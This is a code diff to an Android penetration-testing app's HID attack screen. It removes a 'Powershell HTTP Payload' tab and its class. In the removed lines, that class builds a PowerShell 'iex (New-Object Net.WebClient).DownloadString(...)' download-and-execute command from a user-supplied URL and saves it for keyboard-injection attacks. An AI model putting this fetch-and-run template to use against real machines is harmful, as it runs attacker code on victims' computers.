@@ -314,10 +314,8 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
             switch (i) {
                 case 0:
                     return new PowerSploitFragment();
-                case 1:
-                    return new WindowsCmdFragment();
                 default:
-                    return new PowershellHttpFragment();
+                    return new WindowsCmdFragment();
             }
         }
 
@@ -328,7 +326,7 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
 
         @Override
         public int getCount() {
-            return 3;
+            return 2;
         }
 
         @Override
@@ -336,10 +334,8 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
             switch (position) {
                 case 1:
                     return "Windows CMD";
-                case 0:
-                    return "PowerSploit";
                 default:
-                    return "Powershell HTTP Payload";
+                    return "PowerSploit";
             }
         }
     }
@@ -574,72 +570,4 @@ public class HidFragment extends Fragment implements ActionBar.TabListener {
             }
         }
     }
-
-    public static class PowershellHttpFragment extends HidFragment implements OnClickListener {
-
-        private final String configFilePath =  nh.CHROOT_PATH + "/var/www/html/powershell-payload";
-        private final String configFileUrlPath = nh.CHROOT_PATH + "/var/www/html/powershell-url";
-
-        @Override
-        public View onCreateView(LayoutInflater inflater, ViewGroup container,
-                                 Bundle savedInstanceState) {
-            View rootView = inflater.inflate(R.layout.hid_powershell_http, container, false);
-            Button b = (Button) rootView.findViewById(R.id.powershellOptionsUpdate);
-            b.setOnClickListener(this);
-            loadOptions(rootView);
-            return rootView;
-        }
-
-        public void onClick(View v) {
-            switch (v.getId()) {
-                case R.id.powershellOptionsUpdate:
-                    if(getView() == null){
-                        return;
-                    }
-                    ShellExecuter exe = new ShellExecuter();
-                    EditText newPayloadUrl = (EditText) getView().getRootView().findViewById(R.id.payloadUrl);
-                    String newText = "iex (New-Object Net.WebClient).DownloadString(\"" + newPayloadUrl.getText() + "\"); " ;
-
-                    Boolean isSaved = exe.SaveFileContents(newText, configFileUrlPath);
-                    if (!isSaved){
-                        nh.showMessage("Source not updated (configFileUrlPath)");
-                    }
-                    break;
-                default:
-                    nh.showMessage("Unknown click");
-                    break;
-            }
-        }
-        private void loadOptions(final View rootView) {
-            final EditText payloadUrl = (EditText) rootView.findViewById(R.id.payloadUrl);
-            final ShellExecuter exe = new ShellExecuter();
-
-            new Thread(new Runnable() {
-                public void run() {
-                    final String textUrl = exe.ReadFile_SYNC(configFileUrlPath);
-                    final String text = exe.ReadFile_SYNC(configFilePath);
-                    String regExPatPayloadUrl = "DownloadString\\(\"(.*)\"\\)";
-                    Pattern patternPayloadUrl = Pattern.compile(regExPatPayloadUrl, Pattern.MULTILINE);
-                    final Matcher matcherPayloadUrl = patternPayloadUrl.matcher(textUrl);
-
-                    String[] lines = text.split("\n");
-                    final String line = lines[lines.length - 1];
-
-                    payloadUrl.post(new Runnable() {
-                        @Override
-                        public void run() {
-
-                            if (matcherPayloadUrl.find()) {
-                                String payloadUrlValue = matcherPayloadUrl.group(1);
-                                payloadUrl.setText(payloadUrlValue);
-                            }
-
-                        }
-                    });
-                }
-            }).start();
-        }
-    }
-
-
 }
